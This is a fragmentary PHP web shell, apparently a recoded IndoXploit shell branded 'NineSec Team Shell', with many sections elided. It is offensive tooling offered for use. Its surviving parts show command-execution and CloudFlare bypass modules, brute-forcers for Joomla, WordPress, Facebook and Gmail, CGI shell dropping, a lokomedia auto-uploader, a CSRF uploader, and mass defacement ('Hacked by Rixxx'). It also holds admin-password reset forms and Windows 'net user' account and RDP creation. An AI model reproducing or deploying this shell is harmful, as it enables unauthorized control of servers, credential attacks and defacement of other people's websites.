...
<title>[+] NineSec Team Shelll [+]</title>
<style type="text/css">
html {
	background: #000000;
	color: green;
...
<center><div id="contenttengah"><center>
		<img title="NineSec Team"src="https://k.top4top.io/p_22061rtwm7.png" width="70%"></div> </center>


<span class="style4">Shell Programmer: <br>Rixxx</span><br><br>
<span class="style4">Rixxx: <br>NineSec Team</span><br><br>
<span class="style4">Official Member: <br>Rixxx - ItzzKyy - Farel07 </span><br><br>
<span class="style4">Greetz : <br> NineSec Team </span>
</div></div></div></td>
</div>
...
<font color = "red" face = "Iceland" size = "6">NineSec Team Bypass</font><br><br><br>
...
<font color="#F00000"><font color="#FFF000">root@rixxx:~$</font> Connected ! </font><br>
...
<font color="red">root@rixxx:~$ </font><font color="#FFF000"><?php echo "@". $ServerName ?><br></font><font color="red">Ready To Fuck Server :v</font>
</tr>
</tbody></table>
<br>
...
<font color = "red" face = "Verdana">©2022 - NineSec Team </font> 			
<?php
exit;
}
...
<head>
	<link rel="SHORTCUT ICON" href="https://k.top4top.io/p_22061rtwm7.png">
<title>[+] NineSec Team Shell [+]</title>
<meta name='author' content='Rixxx'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(http://fonts.googleapis.com/css?family=Iceland);
...
echo "&emsp;&emsp;&emsp;";
echo "<font size='20px' color='red' face = 'Rajdhani'>[+] NineSec Team Shell [+]</font>";
echo "&emsp;";
...
//Fungsi log dinonaktifkan oleh Rixxx
/*
$ch = curl_init();
...
<center/><br/><b><font color=white>-=[ Command  Bypass Exploit  By Rixxx ]=-</font></b><br>
<?php
print_r('
<pre>
...
<center><p align="center" dir="ltr"><b><font size="5" face="Tahoma">+--=[ Bypass CloudFlare By Rixxx ]=--+
</font></b></p>
...
function randomt() {
    ...
    */
    ...
    <center><br><br>
    <font color="white" size='+3'><b>+--=[ Automatic Joomla Index Changer By Rixxx ]=--+</b></font><br><br>
    </center>
    <center><b>
...
<form action="?dir=<?php echo $pwd; ?>&amp;do=jbrute" method="post">
    ...
    <meta name="description" content="Rixxx" />
<center>
</br></br>
<center><b><font color="lime">+--=[ Joomla Brute Force By Rixxx ]=--+</font></b><br /><br />
...
<center>
<br><Br><b><font size='2' >+--=[ Wordpress Brute Force  By Rixxx ]=--+</font><br>
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Facebook BruteForce by Rixxx ]=--+</font></b></center><br><br>
	<?php
ob_start();
@set_time_limit(0);
#################################################
...
?>
	...
	<br><br><center><b><font size=4>+--=[ Gmail BruteForce by Rixxx ]=--+</font></b></center><br>
	<center><span style="font-size:30px; font-family:Fredericka the Great; color:#1975FF">Gmail & Hotmail BruteForce Rixxx</span><center><br>
	<?php
   set_time_limit(0); 
error_reporting(0); 
...
elseif($_GET['do'] == 'cgi') {
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi.Rixxx' target='_blank'>Klik Here</a>";
...
elseif($_GET['do'] == 'cgi2') {
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgi2.Rixxx' target='_blank'>Klik Here</a>";
} 
	...
	foreach($domain as $url) {
		foreach($up as $user => $pass) {
			...
			if(preg_match("/Logout|Administrator/", $login)) {
				...
				$data2 = array(
					"judul" => "Rixxx Shell auto exploiter lokomedia",
					"fupload" => "@$file",
					"upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
					);
...
if($_POST['username'] and $_POST['password']){
        ...
        echo "<p align='center' dir='ltr'><font size='2'>Coded By : Rixxx, &amp; Recoded by Rixxx</font></p>";

} elseif($_GET['do'] == 'csrfup')
{	
echo '<html>
<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by Rixxx</h1><br><br>
...
<INPUT class=inputzbut type=submit value=setting name=send>
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Rixxx</textarea><br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='Rixxx'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value=' Rixxx'><br>
		<u>Domains</u>: <br>
...
<?php
	...
	if($_POST['hajar']) {
		...
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='Rixxx' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='Rixxx' placeholder='pass_baru'><br>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked by Rixxx' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='Rixxx'><br>
		<u>Domains</u>: <br>
...
echo "</center></table>";   
	...
	if($_POST['auto_deface_wp']) {
		...
		<input type='text' name='script' height='10' size='50' placeholder='Hacked by Rixxx' required><br>
...
";
	...
	if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
		if($_POST['create']) {
			...
			if($_POST['opsi'] == '1') {
				...
				$cek = exe("net user $user Rixxx");
				if(preg_match("/$user/", exe("net user"))) {
					echo "[change password: <font color=lime>Rixxx</font>] -> ";
					if($cek) {
						echo "<font color=lime>Berhasil</font>";
					} else {
						echo "<font color=red>Gagal</font>";
			...
			echo "-- Create RDP --<br>
			<form method='post'>
			<input type='text' name='user' placeholder='username' value='Rixxx' required>
			<input type='text' name='pass' placeholder='password' value='Rixxx' required>
			<input type='submit' name='create' value='>>'>
			</form>
			-- Option --<br>
			<form method='post'>
 ...
 elseif($_GET['act'] == 'rename_dir') {
	...
	echo "<center>Copyright &copy; ".date("Y")." <br><font color='red'>Recoded IndoXploit Shell By Rixxx";
	}
?> 
